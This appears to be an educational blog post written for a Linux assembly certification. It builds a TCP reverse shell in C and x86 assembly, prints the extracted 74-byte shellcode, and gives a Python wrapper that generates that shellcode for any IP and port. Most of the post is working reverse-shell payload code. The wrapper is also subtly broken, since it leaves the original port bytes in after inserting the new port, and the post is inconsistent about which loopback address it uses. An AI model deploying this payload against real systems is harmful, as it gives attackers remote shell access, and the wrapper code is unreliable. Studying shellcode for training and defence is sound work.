<i>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</i><br /><i> </i><i><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></i><br /><i> </i><i><b>Student ID:</b>&nbsp;SLAE-885</i><br /><i><b>Assignment number: </b>2</i><br /><i><b>Github repo:</b> <a href="https://github.com/abatchy17/SLAE">https://github.com/abatchy17/SLAE&nbsp;</a></i><br /><br /><h2>What are the requirements for a reverse shell?</h2>A reverse shell requires the following:<br /><ol><li>Connect to an IP on a given port (now acting as a client).</li><li>Spawn a shell upon connecting.</li></ol>Most of the process is very similar to <a href="http://www.abatchy.com/2017/05/tcp-bind-shell-in-assembly-null.html">the bind shell example</a> (which means lots of repetition here), with a few twists:<br /><br />1. Listener is <b>external</b>, by that it means our code won't be listening to incoming connections, instead it will connect to an existing open port waiting for a connection.<br />2. IP and port need to be defined in the code, bind shell <b>only </b>needed a port to start listening on.<br /><br /><h2>TCP reverse shell in C</h2><br /><pre style="background: #ffffff; color: black;"><span style="color: #004a43;">#</span><span style="color: #004a43;">include </span><span style="color: maroon;">&lt;</span><span style="color: #40015a;">stdio.h</span><span style="color: maroon;">&gt;</span><br /><span style="color: #004a43;">#</span><span style="color: #004a43;">include </span><span style="color: maroon;">&lt;</span><span style="color: #40015a;">sys/types.h</span><span style="color: maroon;">&gt;</span><span style="color: #004a43;"> </span><br /><span style="color: #004a43;">#</span><span style="color: #004a43;">include </span><span style="color: maroon;">&lt;</span><span style="color: #40015a;">sys/socket.h</span><span style="color: maroon;">&gt;</span><br /><span style="color: #004a43;">#</span><span style="color: #004a43;">include </span><span style="color: maroon;">&lt;</span><span style="color: #40015a;">netinet/in.h</span><span style="color: maroon;">&gt;</span><br /><br /><span style="color: maroon; font-weight: bold;">int</span> client_sockid<span style="color: purple;">;</span>  <span style="color: dimgrey;">// sockfd for client</span><br /><span style="color: maroon; font-weight: bold;">int</span> host_sockid<span style="color: purple;">;</span>    <span style="color: dimgrey;">// sockfd for host</span><br />    <br /><span style="color: maroon; font-weight: bold;">struct</span> sockaddr_in hostaddr<span style="color: purple;">;</span>            <span style="color: dimgrey;">// sockaddr struct </span><br /><br /><span style="color: maroon; font-weight: bold;">int</span> <span style="color: #400000;">main</span><span style="color: #808030;">(</span><span style="color: #808030;">)</span><br /><span style="color: purple;">{</span><br />    <span style="color: dimgrey;">// Create socket</span><br />    client_sockid <span style="color: #808030;">=</span> <span style="color: #400000;">socket</span><span style="color: #808030;">(</span>PF_INET<span style="color: #808030;">,</span> SOCK_STREAM<span style="color: #808030;">,</span> <span style="color: #008c00;">0</span><span style="color: #808030;">)</span><span style="color: purple;">;</span><br /><br />    <span style="color: dimgrey;">// Initialize sockaddr struct to bind socket using it</span><br />    hostaddr<span style="color: #808030;">.</span>sin_family <span style="color: #808030;">=</span> AF_INET<span style="color: purple;">;</span><br />    hostaddr<span style="color: #808030;">.</span>sin_port <span style="color: #808030;">=</span> <span style="color: #400000;">htons</span><span style="color: #808030;">(</span><span style="color: #008c00;">1337</span><span style="color: #808030;">)</span><span style="color: purple;">;</span><br />    hostaddr<span style="color: #808030;">.</span>sin_addr<span style="color: #808030;">.</span>s_addr <span style="color: #808030;">=</span> <span style="color: #400000;">inet_addr</span><span style="color: #808030;">(</span><span style="color: maroon;">"</span><span style="color: #0000e6;">127.0.0.1</span><span style="color: maroon;">"</span><span style="color: #808030;">)</span><span style="color: purple;">;</span><br /><br />    <span style="color: dimgrey;">// Connect to existing listener</span><br />    <span style="color: #400000;">connect</span><span style="color: #808030;">(</span>client_sockid<span style="color: #808030;">,</span> <span style="color: #808030;">(</span><span style="color: maroon; font-weight: bold;">struct</span> <span style="color: #400000;">sockaddr</span><span style="color: #808030;">*</span><span style="color: #808030;">)</span><span style="color: #808030;">&amp;</span>hostaddr<span style="color: #808030;">,</span> <span style="color: maroon; font-weight: bold;">sizeof</span><span style="color: #808030;">(</span>hostaddr<span style="color: #808030;">)</span><span style="color: #808030;">)</span><span style="color: purple;">;</span><br /><br />    <span style="color: dimgrey;">// Duplicate file descriptors for STDIN, STDOUT and STDERR</span><br />    dup2<span style="color: #808030;">(</span>client_sockid<span style="color: #808030;">,</span> <span style="color: #008c00;">0</span><span style="color: #808030;">)</span><span style="color: purple;">;</span><br />    dup2<span style="color: #808030;">(</span>client_sockid<span style="color: #808030;">,</span> <span style="color: #008c00;">1</span><span style="color: #808030;">)</span><span style="color: purple;">;</span><br />    dup2<span style="color: #808030;">(</span>client_sockid<span style="color: #808030;">,</span> <span style="color: #008c00;">2</span><span style="color: #808030;">)</span><span style="color: purple;">;</span><br /><br />    <span style="color: dimgrey;">// Execute /bin/sh</span><br />    execve<span style="color: #808030;">(</span><span style="color: maroon;">"</span><span style="color: #0000e6;">/bin/sh</span><span style="color: maroon;">"</span><span style="color: #808030;">,</span> <span style="color: #7d0045;">NULL</span><span style="color: #808030;">,</span> <span style="color: #7d0045;">NULL</span><span style="color: #808030;">)</span><span style="color: purple;">;</span><br />    <span style="color: maroon; font-weight: bold;">return</span> <span style="color: #008c00;">0</span><span style="color: purple;">;</span><br /><span style="color: purple;">}</span>&nbsp;</pre><br />Again, this code lacks error checking and shouldn't be used as is, for a more robust code, check my <a href="https://github.com/abatchy17/sockets">sockets</a> repo.<br /><br /><h3>Quick break down:</h3>1. Create socket<br />2. Connect to listener<br />3. Redirect STDIN,STDOUT and STDERR to newly created socket from client.<br />4. Spawn the shell. <br /><br /><h2>Converting module to assembly (<i>sigh</i>)</h2>For socket programming through syscalls you'll need to make use of three registers:<br />1. EAX should always contain 0x66, which is the number of socketcall() defined in the linux headers.<br />2. EBX should contain the call ID for the specific socket function you  want to execute, which is defined in /usr/include/linux/net.h<br />3. ECX contains a pointer to the arguments.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/OrTXm31.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/OrTXm31.png" height="336" width="640" /></a></div><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #008073;">global</span> _start<br /><span style="color: #008073;">section</span> .text<br /><br /><span style="color: #e34adc;">_start:</span><br />    <span style="color: #9999a9;">; Socket functions should be accessed through socketcall()</span><br />    <span style="color: #9999a9;">; References:</span><br />    <span style="color: #9999a9;">;   1. http://man7.org/linux/man-pages/man2/socketcall.2.html</span><br />    <span style="color: #9999a9;">;   2. http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210</span><br />    <span style="color: #9999a9;">; Call ids are defined in /usr/include/linux/net.h and should be put in EBX</span><br /><br />    <span style="color: #9999a9;">;</span><br />    <span style="color: #9999a9;">; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)</span><br />    <span style="color: #9999a9;">;</span><br />    <span style="color: #e66170; font-weight: bold;">cdq</span>                 <span style="color: #9999a9;">; EDX = 0x0 | Saves a byte</span><br />    <span style="color: #e66170; font-weight: bold;">xor</span> <span style="color: #d0d09f;">ebx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">ebx</span><br />    <span style="color: #e66170; font-weight: bold;">inc</span> <span style="color: #d0d09f;">ebx</span>             <span style="color: #9999a9;">; EBX = 0x1 | #define SYS_SOCKET 1</span><br />                        <span style="color: #9999a9;">; saves a byte instead of mov bl, 1</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #d0d09f;">edx</span>            <span style="color: #9999a9;">; zeroed out earlier</span><br />                        <span style="color: #9999a9;">; protocol = 0</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #d0d09f;">ebx</span>            <span style="color: #9999a9;">; SOCK_STREAM = 1</span><br />                        <span style="color: #9999a9;">; Needed for bind(), can be used here to save a few bytes</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #00a800;">0x2</span>       <span style="color: #9999a9;">; PF_INET = 2</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">esp</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #00a800;">0x66</span>      <span style="color: #9999a9;">; socketcall()</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">eax</span>             <span style="color: #9999a9;">; EAX = 0x66</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span><br /><br />    <span style="color: #e66170; font-weight: bold;">xchg</span> <span style="color: #d0d09f;">esi</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">eax</span>       <span style="color: #9999a9;">; sockfd is now stored in esi</span><br /><br />    <span style="color: #9999a9;">;</span><br />    <span style="color: #9999a9;">; connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16)</span><br />    <span style="color: #9999a9;">;</span><br />    <span style="color: #e66170; font-weight: bold;">inc</span> <span style="color: #d0d09f;">ebx</span>             <span style="color: #9999a9;">; EBX = 0x2 </span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #00a800;">0x0101017f</span>       <span style="color: #9999a9;">; sockaddr.sin_addr.s_addr: 127.0.0.1 (big endian)</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">word</span> <span style="color: #00a800;">0x3905</span>    <span style="color: #9999a9;">; sockaddr.sin_port       : PORT = 1337</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #d0d09f;">bx</span>             <span style="color: #9999a9;">; sockaddr.sin_family     : AF_INET = 2</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">esp</span>        <span style="color: #9999a9;">; ECX holds pointer to struct sockaddr</span><br /><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #00a800;">0x10</span>           <span style="color: #9999a9;">; sizeof(sockaddr)</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #d0d09f;">ecx</span>            <span style="color: #9999a9;">; pointer to sockaddr</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #d0d09f;">esi</span>            <span style="color: #9999a9;">; sockfd</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">esp</span>        <span style="color: #9999a9;">; ECX holds pointer to arguments</span><br />    <span style="color: #e66170; font-weight: bold;">inc</span> <span style="color: #d0d09f;">ebx</span>             <span style="color: #9999a9;">; EBX = 0x3 | #define SYS_CONNECT 3</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">al</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x66</span>        <span style="color: #9999a9;">; socketcall()</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span><br /><br />    <span style="color: #e66170; font-weight: bold;">xchg</span> <span style="color: #d0d09f;">ebx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">esi</span><br />    <br />    <span style="color: #9999a9;">;</span><br />    <span style="color: #9999a9;">; dup2(ebx, {0,1,2})</span><br />    <span style="color: #9999a9;">;</span><br />    <span style="color: #e66170; font-weight: bold;">xor</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">ecx</span><br /><span style="color: #e34adc;">lbl:</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">al</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x3f</span>  <span style="color: #9999a9;">; dup2()</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span><br />    <span style="color: #e66170; font-weight: bold;">inc</span> <span style="color: #d0d09f;">ecx</span>    <span style="color: #9999a9;">; Iterate over {0,1,2}</span><br />    <span style="color: #e66170; font-weight: bold;">cmp</span> <span style="color: #d0d09f;">cl</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x4</span>   <span style="color: #9999a9;">; Are we done?</span><br />    <span style="color: #e66170; font-weight: bold;">jne</span> <span style="color: #e34adc;">lbl</span>    <span style="color: #9999a9;">; Nope</span><br />    <br />    <span style="color: #9999a9;">; execve("/bin//sh", NULL, NULL)</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #d0d09f;">edx</span>   <span style="color: #9999a9;">; Null terminator</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #00a800;">0x68732f2f</span>  <span style="color: #9999a9;">; "hs//"</span><br />    <span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #00a800;">0x6e69622f</span>  <span style="color: #9999a9;">; "nib/"</span><br />    <br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">ebx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">esp</span>  <span style="color: #9999a9;">; EBX points to "/bin//sh"</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">edx</span>  <span style="color: #9999a9;">; ECX = NULL`</span><br />    <br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">al</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xb</span>   <span style="color: #9999a9;">; execve()</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">0x80</span><br /></pre><br />As you noticed, when calling connect(), we defined port 1337 as 0x3905  instead of 0x0539, and local IP 127.1.1.1 (we avoided 127.0.0.1 because of null characters) was converted to 0x0101017f instead of 0x7F010101. This is because it's in network byte order, which is  big-endian. In the example code you should still call htonl() / inet_addr() even if your  CPU is big-endian for cross compatibility.<br /><br /><h2>Testing our shell</h2><h4>1. Start a listener</h4><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/pn93ioR.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/pn93ioR.png" height="204" width="640" /></a></div><h4>&nbsp;</h4><h4>2. Compile code and run</h4><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/XezGi4W.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/XezGi4W.png" height="108" width="640" /></a></div><h4><br /></h4><h4>3. Check listener</h4><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/DHBvMSq.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/DHBvMSq.png" height="254" width="640" /></a></div><h2>Extracting the shellcode</h2><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">abatchy@ubuntu:~/Desktop/work$</span> objdump -d ./reverse_shell|grep <span style="color: #ba2121;">'[0-9a-f]:'</span>|grep -v <span style="color: #ba2121;">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span style="color: #ba2121;">' '</span>|tr -s <span style="color: #ba2121;">' '</span>|tr <span style="color: #ba2121;">'\t'</span> <span style="color: #ba2121;">' '</span>|sed <span style="color: #ba2121;">'s/ $//g'</span>|sed <span style="color: #ba2121;">'s/ /\\x/g'</span>|paste -d <span style="color: #ba2121;">''</span> -s |sed <span style="color: #ba2121;">'s/^/"/'</span>|sed <span style="color: #ba2121;">'s/$/"/g'</span><br /><span style="color: #888888;">"\x99\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\x6a\x66\x58\xcd\x80\x96\x43\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"</span><br /></pre></div><br /><h2>Python wrapper</h2><br /><!-- HTML generated using hilite.me --><br /><div style="background: #272822; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #75715e;">#!/usr/bin/python</span><br /><br /><span style="color: #f92672;">import</span> <span style="color: #f8f8f2;">socket</span><br /><span style="color: #f92672;">import</span> <span style="color: #f8f8f2;">sys</span><br /><span style="color: #f92672;">import</span> <span style="color: #f8f8f2;">struct</span><br /><br /><span style="color: #66d9ef;">if</span> <span style="color: #f8f8f2;">len(sys</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">argv)</span> <span style="color: #f92672;">is</span> <span style="color: #f92672;">not</span> <span style="color: #ae81ff;">3</span><span style="color: #f8f8f2;">:</span><br />    <span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"Usage: {0} IP PORT"</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">format(sys</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">argv[</span><span style="color: #ae81ff;">0</span><span style="color: #f8f8f2;">])</span><br />    <span style="color: #f8f8f2;">exit()</span><br /><br /><span style="color: #f8f8f2;">ip</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">socket</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">inet_aton(sys</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">argv[</span><span style="color: #ae81ff;">1</span><span style="color: #f8f8f2;">])</span><br /><span style="color: #f8f8f2;">port</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">int(sys</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">argv[</span><span style="color: #ae81ff;">2</span><span style="color: #f8f8f2;">])</span><br /><br /><span style="color: #66d9ef;">if</span> <span style="color: #f8f8f2;">port</span> <span style="color: #f92672;">&lt;</span> <span style="color: #ae81ff;">1</span> <span style="color: #f92672;">or</span> <span style="color: #f8f8f2;">port</span> <span style="color: #f92672;">&gt;</span> <span style="color: #ae81ff;">65535</span><span style="color: #f8f8f2;">:</span><br />    <span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"Are you kidding?"</span><br />    <span style="color: #f8f8f2;">exit()</span><br /><br /><span style="color: #66d9ef;">if</span> <span style="color: #f8f8f2;">port</span> <span style="color: #f92672;">&lt;=</span> <span style="color: #ae81ff;">1000</span><span style="color: #f8f8f2;">:</span><br />    <span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"Port will bind only if run as root"</span><br /><br /><span style="color: #75715e;"># ugly code, don't look</span><br /><span style="color: #f8f8f2;">port</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">format(port,</span> <span style="color: #e6db74;">'04x'</span><span style="color: #f8f8f2;">)</span><br /><span style="color: #f8f8f2;">port</span> <span style="color: #f92672;">=</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x"</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">str(port[</span><span style="color: #ae81ff;">2</span><span style="color: #f8f8f2;">:</span><span style="color: #ae81ff;">4</span><span style="color: #f8f8f2;">])</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x"</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">str(port[</span><span style="color: #ae81ff;">0</span><span style="color: #f8f8f2;">:</span><span style="color: #ae81ff;">2</span><span style="color: #f8f8f2;">])</span><br /><br /><span style="color: #f8f8f2;">ip</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">ip</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">encode(</span><span style="color: #e6db74;">'hex'</span><span style="color: #f8f8f2;">)</span><br /><span style="color: #f8f8f2;">ip</span> <span style="color: #f92672;">=</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x"</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">ip[</span><span style="color: #ae81ff;">0</span><span style="color: #f8f8f2;">:</span><span style="color: #ae81ff;">2</span><span style="color: #f8f8f2;">]</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x"</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">ip[</span><span style="color: #ae81ff;">2</span><span style="color: #f8f8f2;">:</span><span style="color: #ae81ff;">4</span><span style="color: #f8f8f2;">]</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x"</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">ip[</span><span style="color: #ae81ff;">4</span><span style="color: #f8f8f2;">:</span><span style="color: #ae81ff;">6</span><span style="color: #f8f8f2;">]</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x"</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">ip[</span><span style="color: #ae81ff;">6</span><span style="color: #f8f8f2;">:</span><span style="color: #ae81ff;">8</span><span style="color: #f8f8f2;">]</span><br /><br /><span style="color: #f8f8f2;">sc</span> <span style="color: #f92672;">=</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x99</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x31</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xdb</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x43</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x52</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x53</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x6a</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x02</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x89</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xe1</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x6a</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x66</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x58</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xcd</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x80</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x96</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x43</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x68"</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">ip</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x66</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x68"</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">port</span> <span style="color: #f92672;">+</span> <span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x05</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x39</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x66</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x53</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x89</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xe1</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x6a</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x10</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x51</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x56</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x89</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xe1</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x43</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xb0</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x66</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xcd</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x80</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x87</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xde</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x31</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xc9</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xb0</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x3f</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xcd</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x80</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x41</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x80</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xf9</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x04</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x75</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xf6</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x52</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x68</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x2f</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x2f</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x73</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x68</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x68</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x2f</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x62</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x69</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x6e</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x89</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xe3</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x89</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xd1</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xb0</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x0b</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">xcd</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x80"</span><br /><br /><span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"Shellcode generated:"</span><br /><span style="color: #66d9ef;">print</span> <span style="color: #f8f8f2;">sc</span><br /></pre></div><br /><br /><h2>Final notes</h2>1. Shellcode is <b>null free</b> assuming the port number is too.<br />2. Shellcode size is <b>74 bytes</b>. <br />3. Shellcode is <b>register-independant</b>.<br /><br /><h2>References:</h2>1. http://man7.org/linux/man-pages/man2/socketcall.2.html<br />2. http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210<br />3. Hacking: The Art of Exploitation (2nd Edition) - Chapter 4 and 5<br /><br />- Abatchy 